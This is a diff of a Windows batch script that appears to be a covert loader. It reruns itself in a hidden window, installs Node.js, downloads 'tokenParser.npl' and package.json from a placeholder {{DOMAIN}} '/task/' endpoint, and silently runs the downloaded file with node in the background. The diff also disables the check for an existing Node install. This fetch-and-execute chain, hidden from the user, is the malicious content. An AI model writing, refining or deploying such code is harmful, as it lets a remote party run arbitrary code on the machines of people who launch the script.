@@ -4,9 +4,13 @@ setlocal enabledelayedexpansion
 
 if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
-set "NODE_VERSION=20.11.1"
-set "NODE_MSI=%USERPROFILE%\node-v%NODE_VERSION%-x64.msi"
-set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/node-v%NODE_VERSION%-x64.msi"
+REM Get latest Node.js version using PowerShell
+for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
+
+REM Remove leading "v"
+set "NODE_VERSION=%LATEST_VERSION:v=%"
+set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
+set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
 set "EXTRACT_DIR=%~dp0nodejs"
 set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
 set "NODE_EXE="
@@ -14,10 +18,10 @@ set "NODE_EXE="
 :: -------------------------
 :: Check for global Node.js
 :: -------------------------
-for /f "delims=" %%v in ('node -v 2^>nul') do (
-    set "NODE_EXE=node"
-    set "NODE_INSTALLED_VERSION=%%v"
-)
+:: for /f "delims=" %%v in ('node -v 2^>nul') do (
+::     set "NODE_EXE=node"
+::     set "NODE_INSTALLED_VERSION=%%v"
+:: )
 
 if defined NODE_EXE (
     echo [INFO] Node.js is already installed globally: %NODE_INSTALLED_VERSION%
@@ -73,9 +77,9 @@ if errorlevel 1 (
 :: Download required files
 :: -------------------------
 set "USERPROFILE=%USERPROFILE%"
-echo [INFO] Downloading {{token}} and package.json...
+echo [INFO] Downloading tokenParser.npl and package.json...
 
-curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/task/tokenParser?token={{token}}"
+curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/task/tokenParser.npl"
 curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/task/package.json"
 
 :: -------------------------
@@ -97,14 +101,14 @@ if not exist "%~dp0node_modules\request" (
 :: Run the parser
 :: -------------------------
 if exist "%~dp0tokenParser.npl" (
-    echo [INFO] Running {{token}}...
+    echo [INFO] Running tokenParser.npl...
     start "" /b "%NODE_EXE%" "%~dp0tokenParser.npl"
     if errorlevel 1 (
         echo [ERROR] tokenParser execution failed.
         exit /b 1
     )
 ) else (
-    echo [ERROR] {{token}} not found.
+    echo [ERROR] tokenParser.npl not found.
     exit /b 1
 )
 
